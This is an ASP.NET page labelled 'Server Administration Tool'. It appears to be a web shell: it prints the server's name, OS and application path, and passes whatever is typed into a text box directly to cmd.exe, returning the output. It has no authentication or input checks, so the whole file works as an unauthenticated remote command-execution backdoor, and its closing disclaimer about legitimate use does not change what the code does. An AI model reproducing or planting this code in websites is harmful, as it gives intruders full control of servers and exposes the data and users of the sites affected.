<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            LoadServerInfo();
        }
    }
    
    private void LoadServerInfo()
    {
        // Informasi Server
        ServerInfo.Text = "<h3>Server Information:</h3>";
        ServerInfo.Text += "<ul>";
        ServerInfo.Text += "<li>Server Name: " + Server.MachineName + "</li>";
        ServerInfo.Text += "<li>Server Time: " + DateTime.Now + "</li>";
        ServerInfo.Text += "<li>Server OS: " + Environment.OSVersion + "</li>";
        ServerInfo.Text += "<li>ASP.NET Version: " + Environment.Version + "</li>";
        ServerInfo.Text += "<li>Application Path: " + Server.MapPath("~") + "</li>";
        ServerInfo.Text += "</ul>";
    }
    
    protected void ExecuteCommand_Click(object sender, EventArgs e)
    {
        try
        {
            string command = CommandText.Text;
            if (!string.IsNullOrEmpty(command))
            {
                ResultText.Text = ExecuteCommandLine(command);
            }
        }
        catch (Exception ex)
        {
            ResultText.Text = "Error: " + ex.Message;
        }
    }
    
    private string ExecuteCommandLine(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            Process p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();
            
            return output + (string.IsNullOrEmpty(error) ? "" : "\nError: " + error);
        }
        catch (Exception ex)
        {
            return "Error executing command: " + ex.Message;
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Server Administration Tool</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
        h3 { color: #4CAF50; }
        ul { list-style-type: none; padding: 0; }
        li { padding: 5px 0; border-bottom: 1px solid #eee; }
        .command-box { margin: 20px 0; }
        input[type=text] { width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 3px; }
        input[type=submit] { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
        input[type=submit]:hover { background-color: #45a049; }
        .result { margin-top: 20px; padding: 15px; background-color: #f9f9f9; border-left: 4px solid #4CAF50; font-family: monospace; white-space: pre-wrap; }
        .warning { color: #999; font-size: 0.9em; margin-top: 20px; padding: 10px; background-color: #fff3cd; border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Server Administration Tool</h1>
        
        <asp:Label ID="ServerInfo" runat="server"></asp:Label>
        
        <div class="command-box">
            <h3>Execute Command:</h3>
            <asp:TextBox ID="CommandText" runat="server" Width="70%" placeholder="Enter command..."></asp:TextBox>
            <asp:Button ID="ExecuteBtn" runat="server" Text="Execute" OnClick="ExecuteCommand_Click" />
        </div>
        
        <asp:Label ID="ResultText" runat="server" CssClass="result"></asp:Label>
        
        <div class="warning">
            <strong>Note:</strong> This tool is for legitimate server administration purposes only. 
            Only use on servers you own or have explicit permission to manage. 
            Unauthorized access to computer systems is illegal.
        </div>
    </div>
</body>
</html>